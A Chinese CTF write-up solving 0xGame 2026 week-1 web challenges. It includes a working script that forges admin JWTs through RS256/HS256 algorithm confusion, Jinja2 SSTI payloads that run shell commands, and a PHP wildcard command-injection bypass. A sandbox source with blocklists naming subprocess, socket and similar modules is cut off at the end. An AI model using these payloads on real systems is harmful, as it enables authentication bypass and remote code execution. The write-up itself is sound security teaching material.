---
title: 0xgame2026week1-WP
date: '2026-10-17 22:08:42'
tags: []
categories:
  - CTF-Writeups
  - 0xGame2026-Web
slug: 0xgame2026week1-WP
permalink: /0xgame2026week1-wp
draft: false
---

## 1、欢迎来到CTF的世界

下载一个CTF入门指北.pdf，里面介绍了CTF的各个方向以及学习路径，在Reverse的上面有一段这样的话
```
为了奖励你的认真观看，这⾥有⼀串神秘字符送给你：
MHhHYW1le3dlbGNvbWVfdDBfdGhlX3cwcmxkX29mX0NURiF9
这是什么呢？学会使⽤搜索引擎和AI吧！
```
其实就是一串base64编码，解码后
```
0xGame{welcome_t0_the_w0rld_of_CTF!}
```

## 2、奶蛙的博客

这是一个奶娃的博客站点

![](/images/20261017220843.png)

从第一篇开始看

![](/images/20261017220843_1.png)

一篇一篇的看不太现实，写一个爬虫脚本来获取每一篇博客的碎片
```python
import html as html_mod
import re
import sys
import time
import urllib.request

BASE_URL = '实际的URL'
TOTAL_PAGES = 124


def fetch(url, timeout=20, retries=3):
    for attempt in range(1, retries + 1):
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.read().decode('utf-8', 'replace')
        except Exception as e:
            if attempt == retries:
                raise RuntimeError(f'获取失败 {url}: {e}')
            time.sleep(1)


def main():
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

    fragments = []
    for pid in range(1, TOTAL_PAGES + 1):
        page = fetch(f'{BASE_URL}page?id={pid}')
        m = re.search(r'flag-fragment">(.*?)</span>', page, re.S)
        fragments.append(html_mod.unescape(m.group(1).strip()) if m else '')
        time.sleep(0.1)

    result = ''.join(fragments)
    print(f'[+] 拼接结果（{len(result)} 字符）:')
    print(result)


if __name__ == '__main__':
    main()
```
最终把获取的碎片拼接起来就是
```
H4sIAAAAAAAA/wTAwQ2AMAgF0JXaADM4xo9BbQ+UA0GrMe7uK/eyjv11rpNhfLYu0OBpAvYNWsxIU0AXxYMjuA3yBGsUEWQnVE8Kp/z+AAAA//+XJ0P/SwAAAA==
```
这时候就要敏感的发现`H4sI`是gzip的文件头，这时候可以使用随波逐流里面的base64转任意文件。先将该数据保存在`flag.txt`里面，再base64转任意文件，解压就能看到flag了
```
0xGame{n41w4_l4ugh5_cr4wl5_4nd_c0ll3ct5_3v3ry_fr4gm3nt_4cr055_th3_1nt3rn3t}
```

## 3、ATP代码实验
题目描述：线粒体是细胞的能量工厂。本实验模拟有氧呼吸合成 ATP 的过程，提交下方的官方参考代码即可通过。
要求提交的代码与参考代码**完全一致**。

可恶的是
```
注意：本平台**禁止粘贴代码**，请逐字输入。
```

一个一个字敲是不可能的，所以我们需要利用一些工具来解决代码不能粘贴的限制
#### 法一：
利用脚本来破解不能粘贴的限制（本wp以火狐浏览器为主）
打开web开发者工具，输入以下代码
```
(function () {
  'use strict';
  var EVENTS = ['paste', 'beforeinput', 'contextmenu', 'keydown', 'copy', 'cut'];
  EVENTS.forEach(function (name) {
    document.addEventListener(name, function (e) {
      e.stopPropagation(); 
    }, true);               
  });
  for (var i = 1; i < 100000; i++) {
    clearInterval(i);
    clearTimeout(i);
  }

  var banner = document.getElementById('devtools-banner');
  if (banner) banner.classList.remove('show');
  console.log(
    '%c[解除完成] 粘贴 / 右键 / 快捷键限制已绕过，直接 Ctrl+V 试试。',
    'color:#1a7f37;font-weight:bold'
  );
})();
```
这样就成功解除了不能粘贴的问题了，最终的到flag
```
`0xGame{765b817e-a9be-44e3-acf3-1f4dc6698cd5}`
```

#### 法二：
利用burp拦截提交代码的数据包，我们发现提交代码的执行逻辑是
```
fetch('/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ code: editor.value })
```
所以找到POST的/submit包，发送到repeater，将json boby里面的code字段的内容替换成
```
{"code": "/*\n * ============================================\n *      _    _____ ____\n *     / \\  |_   _|  _ \\\n *    / _ \\   | | | |_) |\n *   / ___ \\  | | |  __/\n *  /_/   \\_\\ |_| |_|\n *\n *  ATP 在线实验平台  官方参考代码\n *  实验 1-1  合成 ATP，为细胞供能\n * ============================================\n *\n *  一个葡萄糖分子在有氧条件下彻底氧化，\n *  大约可以合成 30~32 个 ATP。\n *  本程序按三个阶段模拟这一过程。\n */\n\n#include <stdio.h>\n\n#define GLUCOSE  1   /* 反应底物：1 个葡萄糖分子 */\n#define ATP_MAX  32  /* 有氧呼吸的 ATP 理论产量上限 */\n\n/*\n * 阶段一：糖酵解（细胞质基质，不需要氧气）\n *\n * 葡萄糖被分解为两分子丙酮酸，净产生 2 个 ATP，\n * 同时生成少量 NADH，为后续阶段提供原料。\n * 返回丙酮酸分子数。\n */\nint glycolysis(int glucose) {\n    int pyruvate = glucose * 2;\n    int atp = 2;\n    printf(\"[阶段一] 糖酵解：葡萄糖 %d -> 丙酮酸 %d，ATP +%d\\n\",\n           glucose, pyruvate, atp);\n    return pyruvate;\n}\n\n/*\n * 阶段二：柠檬酸循环（线粒体基质）\n *\n * 丙酮酸被彻底氧化为 CO2。这一阶段直接产生的 ATP 很少，\n * 主要产物是 NADH 和 FADH2——它们携带的高能电子\n * 将在第三阶段用于合成 ATP。\n * （含丙酮酸氧化脱羧的贡献，共 10 个 NADH、2 个 FADH2）\n */\nvoid citric_acid_cycle(int pyruvate, int *nadh, int *fadh2) {\n    *nadh  = pyruvate * 5;\n    *fadh2 = pyruvate;\n    printf(\"[阶段二] 柠檬酸循环：NADH %d，FADH2 %d，ATP +2\\n\",\n           *nadh, *fadh2);\n}\n\n/*\n * 阶段三：氧化磷酸化（线粒体内膜）\n *\n * NADH 和 FADH2 沿呼吸链传递电子，把质子泵到膜间隙，\n * 形成跨膜质子梯度。质子经 ATP 合酶回流时驱动其旋转，\n * 催化 ADP + Pi 合成 ATP。\n * 每个 NADH 约合成 2.5 个 ATP，每个 FADH2 约 1.5 个，\n * 细胞约 90% 的 ATP 产自这一阶段。\n */\nint oxidative_phosphorylation(int nadh, int fadh2) {\n    int atp = nadh * 5 / 2 + fadh2 * 3 / 2;\n    printf(\"[阶段三] 氧化磷酸化：ATP +%d\\n\", atp);\n    return atp;\n}\n\nint main(void) {\n    int nadh = 0, fadh2 = 0;\n    int total = 0;\n\n    printf(\"开始模拟有氧呼吸\\n\");\n\n    int pyruvate = glycolysis(GLUCOSE);\n    total += 2;\n\n    citric_acid_cycle(pyruvate, &nadh, &fadh2);\n    total += 2;\n\n    total += oxidative_phosphorylation(nadh, fadh2);\n\n    printf(\"反应结束：葡萄糖 %d 个，共合成 ATP %d 个\\n\",\n           GLUCOSE, total, ATP_MAX);\n\n    return 0;\n}\n"}
```
响应包里面就会携带flag
```json
{"flag":"0xGame{c95e7b06-45ac-439a-aca3-bde306c43299}","message":"Accepted\u2705","ok":true}
```

## 4、错位的签名

![](/images/20261017220843_2.png)

靶场提示：`已知系统中存在一个普通用户账号 guest`。试出密码 `guest123`，登录后 302 跳转到 `/dashboard`。
控制台给出了三个入口：
- `/public-key` —— admin 的 RS256 公钥
- `/hint` —— 提示
- `/flag?jwt=<JWT>` —— 受保护页面（注意：token 直接挂在 URL 上）
点 Flag 页面，返回 **403 权限不足**：
```
GET /flag?jwt=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJndWVzdCIsInJvbGUiOiJndWVzdCIsInN1YiI6Imd1ZXN0IiwiZXhwIjoxNzkyMTU4MTg5LCJuYmYiOjE3OTIxNTQ1Mjl9.VyFck0hb...
-> 403 Forbidden
APISIX 当前识别到的用户是：guest
你当前没有权限访问此页面。
```

这个 403 和 401 的区别是本题的**分水岭**，务必分清：

| 状态码     | 响应体                                          | 含义                                        |
| ------- | -------------------------------------------- | ----------------------------------------- |
| **403** | `APISIX 当前识别到的用户是：guest`                     | 网关**验签已通过**，是业务层发现 `role` 不是 admin → 权限不足 |
| **401** | `{"message":"failed to verify jwt"}`         | **网关自己验签就失败了**，压根没到业务层                    |
| 401     | `{"message":"Missing JWT token in request"}` | 没带 token                                  |

也就是说：**只要能骗过网关的验签，剩下的角色判断就是一个明文 JSON 字段的事。**

`/public-key` 页面：

```
运维留下的说明写着：这是 admin 账户用于 RS256 验签的公钥，网关和客户端都会信任它。

-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA79XYBopfnVMKxI533oU2
VFQbEdSPtWRD+xSl73lHLVboGP1lSIZtnEj5AcTN2uDW6AYPiWL2iA3lEEsDTs7J
BUXyl6pysBPfrqC8n/MOXKaD4e8U5GAHFiwHWg2WzHlfFSlFkLjzp0vPkDK+fQ4C
lrd7shAyitB7use6DHcVCKuI4bFOoFbdI5sBGeyoD833g+ql9bRkH/vf8O+rPwHA
M+47r1iv3lY3ex0P45PRd7U7rq8P8UIw6qOI1tiYuKlFJmjFdcwtYG0dctxWwgL1
+7njrVQoWvuOTSsc9TDMhZkmmSsU3wXjaPxJpydck1C/w9ZLqsctKK5swYWhIcbc
BQIDAQAB
-----END PUBLIC KEY-----
```

`/hint` 页面：

```
- 网关版本：Apache APISIX 3.16.0
- 这是一个已知受影响的历史版本。
- 方向提示：漏洞和 JWT 有关。
- 年份提示：看一看 2026 年修复的 JWT 相关 CVE。
- 再想一想：如果一个系统既信公钥，又信 token 头里的 alg，会发生什么？
```

版本也可以直接从不带认证的响应头确认：`Server: APISIX/3.16.0`。

### 4.1 漏洞原理：JWT 算法混淆
先把两种签名算法的差异摆清楚，后面的所有推理都建立在这上面：

|       | RS256（非对称）                 | HS256（对称）       |
| ----- | -------------------------- | --------------- |
| 密钥    | **私钥签名**，**公钥验签**（两把不同的钥匙） | 同一把密钥**既签名又验签** |
| 密钥保密性 | 公钥可以随便公开                   | 密钥一旦泄露 = 谁都能伪造  |
| 本题的处境 | 我们只有公钥，**签不出**合法签名         |                 |

Hint页面告诉我们：
```
再想一想：如果一个系统既信公钥，又信 token 头里的 `alg`，会发生什么？
```

所以伪造流程为以下：

1. 我们把 header 里的 `"alg": "RS256"` 篡改成 `"alg": "HS256"`；
2. 网关读到 `alg=HS256`，切换到 HMAC 对称验签模式；
3. HMAC 需要一把"共享密钥"，而 `jwt-auth` 插件此时会把配置里那份 key material 原样拿来当 HMAC 密钥——本题配置里放的正是那段 PEM 公钥文本；
4. 于是我们用公开的公钥文本当 HMAC 密钥去签名，服务端拿同一份公钥文本去验——必然通过。
### 4.2 核心疑问：为什么必须把公钥做 base64url 编码？

这是整道题最值得搞懂的一步。很多人第一次做会卡在"我明明把公钥原样复制进去了，为什么签名还是不过"。

 因为JWT Editor 是严格按规范实现的，所以它的 `k` 字段**只认 base64url**。你贴别的格式，它要么直接报错，要么静默解析成一串错误的字节——后者更坑，因为签名不过时你会以为是算法选错了。
#### 第一层：JSON 只能装文本，而密钥是二进制

Burp 的 JWT Editor 新建对称密钥——“New Symmetric”，内部用的是 **JWK（JSON Web Key，RFC 7517）** 格式，长这样：

```json
{
  "kty": "oct",
  "k": "<密钥的原始字节>",
  "kid": "admin-pubkey"
}
```

`k` 字段要放的是**密钥的原始字节**。本题的密钥恰好是一段 ASCII 的 PEM 文本，看着好像直接塞进去也行；但 JWK 是**通用规范**，密钥可能是任意二进制——比如一把 32 字节的随机 AES 密钥，里面出现什么字节都不奇怪。

所以：**`k` 必须是密钥字节的 base64url 编码**。编码之后字符集只剩 `A-Z a-z 0-9 - _`，放进 JSON 里**零转义、绝对安全**。

#### 第二层：为什么是 base64"url"变体，而不是普通 base64？

普通 base64 的字符表里有三个"传输层地雷"：

| 普通 base64 字符 | 在 URL / HTTP 场景的麻烦 |
|---|---|
| `+` | 在 `application/x-www-form-urlencoded` 里会被解析成**空格**，本身必须写成 `%2B` |
| `/` | 是 URL 的路径分隔符，会被当成目录层级 |
| `=` | 补齐长度的填充符，在 query string / cookie 里存在歧义，常被判非法 |

而 JWT 的设计目标就是"**到哪儿都不转义**"：它要能直接塞进 URL query（本题就是 `?jwt=...`）、塞进 `Authorization: Bearer` 头、塞进 JSON body、塞进 cookie，任何一层都不做额外编码。于是 JWT 系规范统一改用 **base64url**（RFC 4648 §5）：

- `+` → `-`
- `/` → `_`
- **去掉末尾的 `=` 填充**

这就是 "url" 三个字的含义：**字符集对 URL / 传输层安全**。它不是另一种加密，只是换了一张字符表。

#### 第三层：编码只是"写法"，不是"内容"

这一步最容易想歪。base64 只是把密钥字节**翻译成工具认识的一种书写格式**；真正喂给 HMAC 的，**永远是解码之后的那串原始字节**。

本题的实际链路：

```
公钥 PEM 文本                    450 字节（原始字节，真正的密钥）
        │
        │  base64url 编码（工具层的"书写格式"）
        ▼
k = "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0K..."    600 字符
        │
        │  JWT Editor 内部自动解码，拿回那 450 字节
        ▼
HMAC-SHA256(key = 那 450 字节)
```

所以请记住这句话：**base64url 字符串本身从来不是密钥，它只是密钥的"文本外衣"。** 如果你把这段 600 字符的文本**原样**当密钥去做 HMAC，签出来的东西一定是错的——服务端解出来的才是真字节。

理解了这一层，也就理解了为什么"**字节必须一个不差**"。


### 4.3 公钥转 base64url

在burp里面的编码工具就可以转化

![](/images/20261017220843_3.png)

完整 PEM 的转换结果（600 字符）：

```
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE3OVhZQm9wZm5WTUt4STUzM29VMgpWRlFiRWRTUHRXUkQreFNsNzNsSExWYm9HUDFsU0ladG5FajVBY1ROMnVEVzZBWVBpV0wyaUEzbEVFc0RUczdKCkJVWHlsNnB5c0JQZnJxQzhuL01PWEthRDRlOFU1R0FIRml3SFdnMld6SGxmRlNsRmtManpwMHZQa0RLK2ZRNEMKbHJkN3NoQXlpdEI3dXNlNkRIY1ZDS3VJNGJGT29GYmRJNXNCR2V5b0Q4MzNnK3FsOWJSa0gvdmY4TytyUHdIQQpNKzQ3cjFpdjNsWTNleDBQNDVQUmQ3VTdycThQOFVJdzZxT0kxdGlZdUtsRkptakZkY3d0WUcwZGN0eFd3Z0wxCis3bmpyVlFvV3Z1T1RTc2M5VERNaFprbW1Tc1Uzd1hqYVB4SnB5ZGNrMUMvdzlaTHFzY3RLSzVzd1lXaEljYmMKQlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t
```

### 4.4 Burp 的JWT Editor 插件

先创建KEY

![](/images/20261017220843_4.png)

 **抓 guest 的 token。** 在控制台点一下 Flag 页面（弹 403，没关系），在 HTTP 历史里找到：

   ```
   GET /flag?jwt=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
   ```

   解出来是：

   - header：`{"alg":"RS256","typ":"JWT"}`
   - payload：`{"key":"guest","role":"guest","sub":"guest","exp":1792158189,"nbf":1792154529}`


 **改包。** 请求发到 Repeater，切到【JWT Editor】标签，改两处：

   - Header：`"alg": "RS256"` → `"alg": "HS256"` ← **攻击核心**
   - Payload：`"key"`、`"role"`、`"sub"` 三个字段全改成 `admin`

**重签。** 点【Sign】→ 选 `admin-pubkey` → 算法选 `HS256` → OK。

**发送。** 响应 **200**，页面出现 flag。

### 4.5 脚本化一键打通

```python
import base64, hmac, hashlib, json, re, html, time
import urllib.request, urllib.error, http.cookiejar

BASE = "题目的URL"

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
opener.addheaders = [("User-Agent", "Mozilla/5.0")]

def fetch(url, data=None):
    try:
        with opener.open(url, data=data, timeout=20) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def b64ud(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)).decode()

# ---------- 1. 以 guest 登录，拿到 guest 的 token 看结构 ----------
fetch(BASE + "/login", data=b"username=guest&password=guest123")
st, dash = fetch(BASE + "/dashboard")
guest_jwt = re.search(r"/flag\?jwt=([A-Za-z0-9_.\-]+)", dash).group(1)
h, p, _ = guest_jwt.split(".")
print("[1] guest header :", b64ud(h))
print("    guest payload:", b64ud(p))

# ---------- 2. 抓公钥（正则必须圈住结尾 5 个减号！）----------
st, pk = fetch(BASE + "/public-key")
pem = html.unescape(
    re.search(r"-{5}BEGIN PUBLIC KEY.*?END PUBLIC KEY-{5}", pk, re.S).group(0)
).strip()
raw = pem.encode()
print("[2] PEM 字节数 =", len(raw))
assert raw.startswith(b"-----BEGIN") and raw.endswith(b"-----"), "PEM 头尾被截断了！"

# ---------- 3. 伪造 admin 的 HS256 token ----------
now = int(time.time())
header  = {"alg": "HS256", "typ": "JWT"}                    # 攻击核心：RS256 -> HS256
payload = {"key": "admin", "role": "admin", "sub": "admin",
           "exp": now + 3600, "nbf": now - 60}

signing_input = "{}.{}".format(
    b64u(json.dumps(header,  separators=(",", ":")).encode()),
    b64u(json.dumps(payload, separators=(",", ":")).encode()),
)
# 关键：把「公开的公钥字节」当作 HMAC 的对称密钥
sig = hmac.new(raw, signing_input.encode(), hashlib.sha256).digest()
forged = signing_input + "." + b64u(sig)

# ---------- 4. 打 /flag ----------
st, body = fetch(BASE + "/flag?jwt=" + forged)
print("[3] /flag ->", st)
m = re.search(r"0xGame\{[^}]+\}", body)
print("[+] FLAG =", m.group(0) if m else "未拿到：" + body[:200])
```

## 5、渲染如呼吸一样简单
题目描述是：`这是给运营同学临时预览模板片段用的调试页，你能找到通往get shell的大门吗？`
所以题目提示的很明显，应该是可以命令执行的。

进入题目后，发现给的是一个模板。所以考点就有XSS+RCE或者SSTI+RCE。
先尝试能不能XSS+RCE。
尝试发送XSS的弹窗payload`<script>alert(1)</script>`，结果确实可以弹窗，但是这不是真实业务，不会真的获取某某用户的信息，除非题目有bot访问。
所以SSTI+RCE的概率大很多。
尝试发送SSTI的payload`{{7*7}}`，结果返回了49，说明存在SSTI模板注入。
继续尝试其他的payload
```html
Render
{{config}}

Render Result
<Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': 'render-preview-dev-key', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>

Render
{{cycler.__init__.__globals__.os.popen("env").read()}}

Render Result
KUBERNETES_SERVICE_PORT=449 KUBERNETES_PORT=1449 HOSTNAME=dep-c0e2a927-7065-456c-8082-b314ba324b40-86dd46946f-xlnpp HOME=/home/ctf GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305 PYTHON_SHA256=5c8462af5790baf43a321a1559dbe0db06d1be4300fb85fb53c40060668e548a WERKZEUG_SERVER_FD=3 KUBERNETES_PORT_443_TCP_ADDR=unix:///var/run/docker.sock PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin KUBERNETES_PORT_443_TCP_PORT=1449 KUBERNETES_PORT_443_TCP_PROTO= LANG=C.UTF-8 PYTHON_VERSION=3.12.14 KUBERNETES_PORT_443_TCP= KUBERNETES_SERVICE_PORT_HTTPS=449 KUBERNETES_SERVICE_HOST=unix:///var/run/docker.sock PWD=/app FLAG=0xGame{019cab5a-b296-41a6-8d55-a309edd526c4}
```
方法还有很多
```
{{lipsum.__globals__.os.popen("env").read()}}

{{joiner.__init__.__globals__.os.popen("env").read()}}
```

## 6、一切的开始
题目描述：`让我康康你的工具安装正不正常（不正常请call inex）`
进入题目后，页面显示：`不知道干什么？扫扫目录康康？`，其实脑子里想到的第一个就是`robots.txt`。
```
User-agent: *
Disallow: /inex233
# 访问inex233页面
```

请get传参aaa=flag，打开hackbar用get传入

![](/images/20261017220843_5.png)

请post传参bbb=flag

![](/images/20261017220843_6.png)

要带上sweet的小饼干，其实这里的小饼干就是Cookie

![](/images/20261017220843_7.png)

你必须来自127.0.0.1，这里意思是，你必须是从Referer：127.0.0.1跳转过来的

![](/images/20261017220843_8.png)

请json传参web：flag，这里我们就要使用burp了。将Content-Type改成 application/json，把body改成`{"web":"flag","bbb":"flag"}`
完整的请求包是
```
POST /inex233?aaa=flag HTTP/1.1
Host: 5000-4160fada-b970-438c-802b-aef8c9edae35.challenge.ctfplus.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:158.0) Gecko/20100101 Firefox/158.0
Referer: http://127.0.0.1/
Content-Type: application/json
Content-Length: 27
Origin: http://5000-4160fada-b970-438c-802b-aef8c9edae35.challenge.ctfplus.cn
Connection: keep-alive
Cookie: _ga_BFDVYZJ3DE=GS2.1.s1792204192$o19$g1$t1792204351$j57$l0$h0; _ga=GA1.1.242289672.1779001013; _clck=1q7gq3l%5E2%5Egad%5E0%5E2328; _clsk=rdxr6q%5E1792204351384%5E12%5E1%5Eu.clarity.ms%2Fcollect;sweet=sweet

{"web":"flag","bbb":"flag"}
```
就能获取flag了

## 7、ez_64
给了一段php代码
```php
<?php   chdir(__DIR__);      

if (isset($_GET['c'])) {    
		$c = $_GET['c'];       if (preg_match("#^[/?. fla64]*$#", $c)) {       
				 system($c);      
		} else {           
				die("no no no!");       
		}   
} else {    
		highlight_file(__FILE__);   
}
```

`$_GET['c']`用get方式传入一个c；
`preg_match("#^[/?. fla64]*$#", $c)`这里是一个白名单，只接受这些字符，否则返回no no no！
system($c)将 $c拼接到了system里面了，说明可以进行命令执行这里我们注意到，`?`是被允许使用的，作为一个通配符，我们可以使用他代替缺失的字母。

- PHP 的白名单只检查字符串字面量—— 它数你写了哪些字符，不关心这些字符之后会被怎样解释
- `system()` 把字符串交给 `/bin/sh -c`，而 shell 的语法里 `?` = 匹配任意单个字符
- 白名单检查在 PHP 层，通配展开在 shell 层 —— 两层理解不同，就有了绕过空间

用 `?` 补出 base64 的完整路径
目标：`/bin/base64`。要藏的字母是 `b i n s e`：
```
/bin     →  /???        （b、i、n 全用 ? 占位，3 个字符）
base64   →  ????64      （b、a、s、e 四个 ? + 字面 64，共 6 字符）
拼起来：    /???/????64
```
为什么能唯一命中：`/???` 匹配 `/` 下所有 3 字母目录（bin、dev、etc…），`/????64` 要求 6 字符且以 `64` 结尾 —— 两个条件同时满足的只有 **`/bin/base64`**（`/usr/bin/base64` 因为 `/usr` 是 4 字母被排除）

 找 flag 文件名（长度扫描）
- 工作目录 = 脚本所在目录（`chdir(__DIR__)`），文件名未知
- 线索：白名单特意加了 `6` 和 `4` —— 文件名大概率是 `fla6`（flag 的 leet 写法）
- 第一次试 `fla?`（4 字符）→ 响应空 → 说明不存在 4 字符的 `flaX` 文件
- 于是按长度枚举：`fla??`(5) → `fla???`(6) → `fla????`(7) → `fla?????`(8) 命中
最终构造出payload为
```
/?c=/???/????64%20fla?????
```
返回
```
PD9waHAKJGZsYWcgPSAnMHhHYW1lezBkZGZlODk2LTE1NmMtNDE4MS05YjUzLThiNDM1MzQ3NmRh Mn0nOwo/Pgo=
```
base64解码后
```php
<?php
$flag = '0xGame{0ddfe896-156c-4181-9b53-8b4353476da2}';
?>
```

## 8、漏风的沙箱
给了一个app.py
```python
import ast  
import builtins  
import io  
import os  
import re  
import threading  
import traceback  
import unicodedata  
from contextlib import redirect_stdout  
from flask import Flask, jsonify, render_template, request  
app = Flask(__name__)  
SANDBOX_TIMEOUT = int(os.environ.get('SANDBOX_TIMEOUT', '5'))  
MAX_CODE_LEN = 5000  
MAX_OUTPUT_LEN = 100000  
PORT = int(os.environ.get('PORT', '18085'))  
dangerous_patterns = [  
    r'\bos\.system\b',  
    r'\bos\.popen\b',  
    r'\bos\.spawn\b',  
    r'\bos\.exec\b',  
    r'\bos\.fork\b',  
    r'\bsubprocess\b',  
    r'\bcommands\b',  
    r'\b__import__\s*\(',  
    r'\beval\s*\(',  
    r'\bexec\s*\(',  
    r'\bcompile\s*\(',  
    r'\bopen\s*\(',  
    r'\bfile\s*\(',  
    r'\b__builtins__\b',  
    r'\bimport\s+os\b',  
    r'\bimport\s+sys\b',  
    r'\bimport\s+subprocess\b',  
    r'\bimport\s+pymysql\b',  
    r'\bimport\s+sqlite3\b',  
    r'\bimport\s+requests\b',  
    r'\bimport\s+urllib\b',  
    r'\bimport\s+http\b',  
    r'\bimport\s+socket\b',  
    r'\bimport\s+ftplib\b',  
    r'\bimport\s+telnetlib\b',  
    r'\bimport\s+pickle\b',  
    r'\bimport\s+cpickle\b',  
    r'\bimport\s+marshal\b',  
    r'\bimport\s+ctypes\b',  
    r'\bimport\s+multiprocessing\b',  
    r'\bimport\s+threading\b',  
    r'\bimport\s+concurrent\b',  
    r'\bimport\s+io\b',  
    r'\bimport\s+shlex\b',  
    r'\bimport\s+pty\b',  
    r'\bimport\s+popen\b',  
    r'\bimport\s+shutil\b',  
    r'\bimport\s+platform\b',  
    r'\bimport\s+cffi\b',  
    r'\bimport\s+importlib\b',  
    r'\bgetattr\s*\(.*__import__',  
    r'\bgetattr\s*\(.*eval',  
    r'\bgetattr\s*\(.*exec',  
    r'\bsetattr\s*\(',  
    r'\b__getattribute__\b',  
    r'\b__setattr__\b',  
]  
COMPILED_PATTERNS = [re.compile(p) for p in dangerous_patterns]  
BANNED_MODULES = [  
    'os', 'sys', 'subprocess', 'pymysql', 'sqlite3',  
    'requests', 'urllib', 'http', 'socket', 'ftplib', 'telnetlib',  
    'pickle', 'cpickle', 'marshal', 'ctypes',  
    'multiprocessing', 'threading', 'concurrent',  
    'importlib', 'imp', 'builtins',  
    'shlex', 'pty', 'popen', 'shutil', 'platform', 'cffi', 'io',  
]  
BANNED_FUNCTIONS = [  
    'eval', 'exec', 'compile', '__import__',  
    'getattr', 'setattr', 'delattr',  
    'globals', 'locals', 'vars', 'dir', 'type',  
    'input', 'open', 'file', 'execfile', 'reload',  
]  
BANNED_METHODS = [  
    'system', 'popen', 'spawn', 'execv', 'execl', 'execve', 'execlp', 'execvp',  
    'chdir', 'kill', 'remove', 'unlink', 'rmdir', 'mkdir', 'makedirs', 'removedirs',  
    'read', 'write', 'readlines', 'writelines',  
    'load', 'loads', 'dump', 'dumps',  
    'get_data', 'get_source', 'get_code', 'load_module', 'exec_module',  
]  
DANGEROUS_ATTRIBUTES = [  
    '__class__', '__base__', '__bases__', '__mro__', '__subclasses__',  
    '__globals__', '__builtins__', '__getattribute__', '__getattr__',  
    '__setattr__', '__delattr__', '__call__',  
]  
class FilterError(Exception):  
    pass  
class ASTFilter(ast.NodeVisitor):  
    def visit_Import(self, node):  
        for alias in node.names:  
            raise FilterError()  
        self.generic_visit(node)  
    def visit_ImportFrom(self, node):  
        raise FilterError()  
    def visit_Attribute(self, node):  
        if node.attr in DANGEROUS_ATTRIBUTES:  
            raise FilterError()  
        if node.attr in BANNED_METHODS:  
            raise FilterError()  
        if node.attr in BANNED_FUNCTIONS:  
            raise FilterError()  
        self.generic_visit(node)  
    def visit_Call(self, node):  
        func = node.func  
        if isinstance(func, ast.Name) and func.id in BANNED_FUNCTIONS:  
            raise FilterError()  
        self.generic_visit(node)  
    def visit_Subscript(self, node):  
        if isinstance(node.slice, ast.Constant) and isinstance(node.slice.value, str):  
            key = node.slice.value  
            if key in DANGEROUS_ATTRIBUTES or key in BANNED_METHODS \  
                    or key in BANNED_FUNCTIONS or key in BANNED_MODULES:  
                raise FilterError()  
        self.generic_visit(node)  
def _sandbox_builtins():  
    b = dict(builtins.__dict__)  
    b.pop('breakpoint', None)  
    b.pop('input', None)  
    return b  
SANDBOX_BUILTINS = _sandbox_builtins()  
def run_sandbox(code):  
    code = unicodedata.normalize('NFKC', code)  
    for pattern in COMPILED_PATTERNS:  
        if pattern.search(code):  
            return {'status': 'blocked', 'output': ''}  
    try:  
        tree = ast.parse(code)  
    except SyntaxError:  
        return {'status': 'blocked', 'output': ''}  
    visitor = ASTFilter()  
    try:  
        visitor.visit(tree)  
    except FilterError:  
        return {'status': 'blocked', 'output': ''}  
    sandbox = {'__builtins__': dict(SANDBOX_BUILTINS)}  
    buf = io.StringIO()  
    result = {}  
    def _exec():  
        try:  
            with redirect_stdout(buf):  
                exec(code, sandbox)  
            result['output'] = buf.getvalue()  
        except SystemExit:  
            result['error'] = 'SystemExit'  
        except BaseException:  
            result['error'] = traceback.format_exc()  
    worker = threading.Thread(target=_exec, daemon=True)  
    worker.start()  
    worker.join(SANDBOX_TIMEOUT)  
    if worker.is_alive():  
        return {'status': 'timeout', 'output': ''}  
    if 'error' in result:  
        return {'status': 'error',  
                'output': (buf.getvalue() + '\n' + result['error'])[:MAX_OUTPUT_LEN]}  
    output = result.get('output', '')  
    if len(output) > MAX_OUTPUT_LEN:  
        output = output[:MAX_OUTPUT_LEN]  
    return {'status': 'ok', 'output': output}  
@app.route('/')  
def index():  
    return render_template('index.html')  
@app.route('/run', methods=['POST'])  
def run():  
    data = request.get_json(silent=True) or {}  
    code = data.get('code', '')  
    if not isinstance(code, str) or not code.strip():  
        return jsonify({'status': 'ok', 'output': ''})  
